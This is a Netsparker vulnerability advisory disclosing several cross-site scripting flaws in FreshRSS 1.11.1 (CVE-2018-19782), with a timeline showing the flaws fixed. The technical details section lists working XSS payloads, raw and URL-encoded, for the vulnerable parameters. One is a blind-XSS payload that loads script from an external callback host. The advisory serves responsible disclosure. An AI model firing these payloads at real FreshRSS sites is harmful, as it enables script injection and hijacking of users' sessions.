@@ -1,0 +1,68 @@
+Multiple Cross-Site Scripting Vulnerabilities in FreshRSS 1.11.1
+
+Information
+--------------------
+
+Advisory by Netsparker
+Name: Multiple Cross-Site Scripting Vulnerabilities in FreshRSS
+Affected Software: FreshRSS
+Affected Versions: 1.11.1
+Homepage: https://freshrss.org/
+Vulnerability: Cross-site Scripting
+Severity: Medium
+Status: Fixed
+CVE-ID : CVE-2018-19782
+CVSS Score (3.0): 6.3
+Netsparker Advisory Reference: NS-18-024
+
+Technical Details
+--------------------
+
+Blind Cross-site Scripting
+
+URL  : http://ns.app:8085/i/?c=auth&a='"--></style></scRipt><scRipt src="//4cipl0hyi5btaxbj3ovzc7b6e6eckgescau78dxgsho.r87.me"></scRipt>  Parameter Name : a
+Parameter Type  : GET
+Attack Pattern  : %27%22--%3e%3c%2fstyle%3e%3c%2fscRipt%3e%3cscRipt+src%3d%22%2f%2f4cipl0hyi5btaxbj3ovzc7b6e6eckgescau78dxgsho%26%2346%3br87%26%2346%3bme%22%3e%3c%2fscRipt%3e
+
+Stored Cross-site Scripting
+
+URL  : http://ns.app:8085/i/?c=error  
+Injection URL  : http://ns.app:8085/i/?c=error  
+Parameter Name  : a
+Parameter Type  : GET
+Attack Pattern  : '"--></style></scRipt><scRipt>netsparker(0x00139F)</scRipt>  
+
+Cross-site Scripting
+
+URL  : http://ns.app:8085/i/?c=error  
+Proof URL  : http://ns.app:8085/i/?c=error  
+Injection URL  : http://ns.app:8085/i/?c=%3ciMg%20src%3dN%20onerror%3dnetsparker(0x001DCF)%3e&a=actualize&id=-1  
+Parameter Name  : c
+Parameter Type  : GET
+Attack Pattern  : %3ciMg+src%3dN+onerror%3dnetsparker(0x001DCF)%3e  
+
+URL  : http://ns.app:8085/i/?c=error  
+Proof URL  : http://ns.app:8085/i/?c=error  
+Injection URL  : http://ns.app:8085/i/?a=%3ciMg%20src%3dN%20onerror%3dnetsparker(0x001F6B)%3e&get=s&order=ASC  
+Parameter Name  : a
+Parameter Type  : GET
+Attack Pattern  : %3ciMg+src%3dN+onerror%3dnetsparker(0x001F6B)%3e  
+
+For more information on cross-site scripting vulnerabilities read the article Cross-site Scripting (XSS).
+
+Advisory Timeline
+--------------------
+
+12th November 2018- First Contact
+28th November 2018 - Vendor Fixed
+3rd December 2018 - Advisory Released
+
+Credits & Authors
+--------------------
+
+These issues have been discovered by Omar Kurt while testing Netsparker Web Application Security Scanner.
+
+About Netsparker
+--------------------
+
+Netsparker web application security scanners find and report security flaws and vulnerabilities such as SQL Injection and Cross-site Scripting (XSS) in all websites and web applications, regardless of the platform and technology they are built on. Netsparker scanning engineas unique detection and exploitation techniques allow it to be dead accurate in reporting vulnerabilities. The Netsparker web application security scanner is available in two editions; Netsparker Desktop and Netsparker Cloud. Visit our website https://www.netsparker.com for more information.
